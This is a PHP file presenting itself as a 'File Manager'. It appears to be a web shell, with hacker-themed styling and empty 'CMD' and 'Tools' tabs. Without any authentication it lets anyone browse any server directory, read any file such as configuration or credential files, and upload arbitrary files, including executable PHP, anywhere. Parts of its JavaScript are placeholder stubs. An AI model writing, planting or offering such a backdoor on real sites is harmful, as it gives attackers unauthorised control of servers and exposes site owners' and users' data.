<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 2 hours
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function path() {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getCookieDir();
    $dir = str_replace("\\", "/", $dir);
    @chdir($dir);
    setCookieDir($dir);
    return $dir;
}

function renderFileList($dir) {
    // Pastikan direktori yang diberikan valid
    if (!is_dir($dir)) {
        return "<p>Direktori tidak ditemukan.</p>";
    }

    // Mengambil semua item di direktori
    $items = scandir($dir);
    $directories = [];
    $files = [];

    // Menghindari path root absolut di sistem
    if ($dir !== '/' && $dir !== getcwd()) {
        $parentPath = dirname($dir);

        // Memastikan path parent di Windows dan Linux
        $parentPath = realpath($parentPath);

        $directories[] = [
            'name' => '..',
            'path' => $parentPath,
            'type' => 'dir',
            'link' => "<a href='#' class='dir-link' data-dir='" . urlencode($parentPath) . "'>..</a>"
        ];
    }

    // Mengiterasi item di direktori
    foreach ($items as $item) {
        if ($item == "." || $item == "..") continue;

        $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
        $info = [
            'name' => $item,
            'path' => $itemPath,
            'link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . urlencode($itemPath) . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . urlencode($itemPath) . "'>$item</a>"
        ];

        if (is_dir($itemPath)) {
            $directories[] = array_merge($info, ['type' => 'dir']);
        } elseif (is_file($itemPath)) {
            $files[] = array_merge($info, ['type' => 'file']);
        }
    }

    // Menghasilkan HTML untuk direktori dan file
    $html = "<div class='directories'><h3>Directories</h3><ul>";
    foreach ($directories as $dir) {
        $html .= "<li>{$dir['link']}</li>";
    }
    $html .= "</ul></div><div class='files'><h3>Files</h3><ul>";
    foreach ($files as $file) {
        $html .= "<li>{$file['link']}</li>";
    }
    $html .= "</ul></div>";

    return $html;
}


$dir = path();

if (isset($_GET['dir'])) {
    echo renderFileList($dir);
    exit();
} elseif (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'create_folder':
            if (isset($_POST['folder_name'])) {
                $folderName = $_POST['folder_name'];
                $newFolderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
                if (!file_exists($newFolderPath)) {
                    mkdir($newFolderPath);
                }
            }
            break;

        case 'create_file':
            if (isset($_POST['file_name'])) {
                $fileName = $_POST['file_name'];
                $newFilePath = $dir . DIRECTORY_SEPARATOR . $fileName;
                if (!file_exists($newFilePath)) {
                    touch($newFilePath);
                }
            }
            break;

        case 'upload':
            if (isset($_FILES['upload_file'])) {
                $file = $_FILES['upload_file'];
                $targetFile = $dir . DIRECTORY_SEPARATOR . basename($file['name']);
                move_uploaded_file($file['tmp_name'], $targetFile);
            }
            break;

        case 'view':
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                $content = file_get_contents($file);
                if ($content !== false) {
                    echo "<p>File Contents: " . htmlspecialchars($file) . "</p>";
                    echo '<pre>' . htmlspecialchars($content) . '</pre>';
                } else {
                    echo "<p>Unable to read file.</p>";
                }
            }
            break;
    }
    exit();
}

// Render initial file list
echo renderFileList($dir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
    font-family: 'Courier New', Courier, monospace;
    background-color: #121212;
    color: #e0e0e0;
}

.sidebar-header h3 {
    color: #00ff00;
}

.navbar, .modal-header {
    background-color: #1e1e1e;
}

.modal-content {
    background-color: #2e2e2e;
    border: 1px solid #00ff00;
}

.modal-body {
    color: #e0e0e0;
}

.list-unstyled a {
    color: #00ff00;
}

.list-unstyled a:hover {
    color: #ff00ff;
}

h2 {
    color: #00ff00;
}

#file-list {
    border: 1px solid #00ff00;
    border-radius: 5px;
    padding: 15px;
    margin-top: 20px;
}

.table {
    color: #e0e0e0;
    border-color: #00ff00;
}

.table thead th {
    background-color: #1e1e1e;
}

.table tbody tr:nth-child(even) {
    background-color: #2e2e2e;
}

.table tbody tr:hover {
    background-color: #3e3e3e;
}

@media (max-width: 767px) {
    #sidebar {
        position: relative;
        height: auto;
        width: 100%;
    }
    #sidebar ul {
        display: flex;
        flex-direction: row;
        justify-content: space-around;
    }
}
    </style>
</head>
<body>
<div class="container">
    <h1 class="header">File Manager</h1>
    <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="explorer-tab" data-toggle="pill" data-target="#explorer" type="button" role="tab" aria-controls="explorer" aria-selected="true">Home</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="cmd-tab" data-toggle="pill" data-target="#cmd" type="button" role="tab" aria-controls="cmd" aria-selected="false">CMD</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="tools-tab" data-toggle="pill" data-target="#tools" type="button" role="tab" aria-controls="tools" aria-selected="false">Tools</button>
        </li>
    </ul>

    <div class="info-section mb-4">
        <!-- Info section here -->
    </div>

    <div class="file-manager">
        <div id="file-list"></div>
    </div>

    <div class="mb-3">
        <a href="javascript:void(0);" onclick="show('xnewfolder')" class="text-success">[ New Folder ]</a>
        <a href="javascript:void(0);" onclick="show('xnewfile')" class="text-success">[ New File ]</a>
        <a href="javascript:void(0);" onclick="show('xnewupload')" class="text-success">[ Upload ]</a>
    </div>

    <div id="xnewfolder" class="mb-3" style="display:none;">
        <form id="create-folder-form">
            <div class="form-group">
                <label for="folder-name">Folder Name:</label>
                <input type="text" class="form-control" id="folder-name" name="folder_name" required>
            </div>
            <button type="submit" class="btn btn-primary">Create Folder</button>
        </form>
    </div>
    <div id="xnewfile" class="mb-3" style="display:none;">
        <form id="create-file-form">
            <div class="form-group">
                <label for="file-name">File Name:</label>
                <input type="text" class="form-control" id="file-name" name="file_name" required>
            </div>
            <button type="submit" class="btn btn-primary">Create File</button>
        </form>
    </div>
    <div id="xnewupload" class="mb-3" style="display:none;">
        <form id="upload-form" enctype="multipart/form-data">
            <div class="form-group">
                <label for="upload-file">Upload File:</label>
                <input type="file" class="form-control" id="upload-file" name="upload_file" required>
            </div>
            <button type="submit" class="btn btn-primary">Upload</button>
        </form>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
$(document).ready(function() {
    function loadDirectory(dir) {
        $.get('', { dir: dir }, function(data) {
            $('#file-list').html(data);
        });
    }

    $(document).on('click', '.dir-link', function() {
        const dir = $(this).data('dir');
        loadDirectory(dir);
    });

    $(document).on('click', '.file-link', function() {
        const file = $(this).data('file');
        $.get('', { action: 'view', file: file }, function(data) {
            $('#file-list').html(data);
        });
    });

    $('#create-folder-form').on('submit', function(event) {
        event.preventDefault();
        $.post('', $(this).serialize() + '&action=create_folder', function(data) {
            loadDirectory('');
        });
    });

    $('#create-file-form').on('submit', function(event) {
        event.preventDefault();
        $.post('', $(this).serialize() + '&action=create_file', function(data) {
            loadDirectory('');
        });
    });

    $('#upload-form').on('submit', function(event) {
        event.preventDefault();
        $.ajax({
            url: '',
            type: 'POST',
            data: new FormData(this),
            processData: false,
            contentType: false,
            success: function(data) {
                loadDirectory('');
            }
        });
    });

    // Initial load
    loadDirectory('');
});

function show(id) {
    document.getElementById(id).style.display = 'block';
}
document.addEventListener('DOMContentLoaded', function() {
    // Example function to handle file creation
    document.getElementById('create-file-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const fileName = document.getElementById('file-name').value;
        // AJAX call to create the file
        console.log('Creating file:', fileName);
        // Your AJAX logic here
    });

    // Example function to update file list
    function updateFileList() {
        // AJAX call to fetch and display the list of files
        console.log('Fetching file list');
        // Your AJAX logic here
    }

    // Call updateFileList on page load
    updateFileList();
});

</script>
</body>
</html>
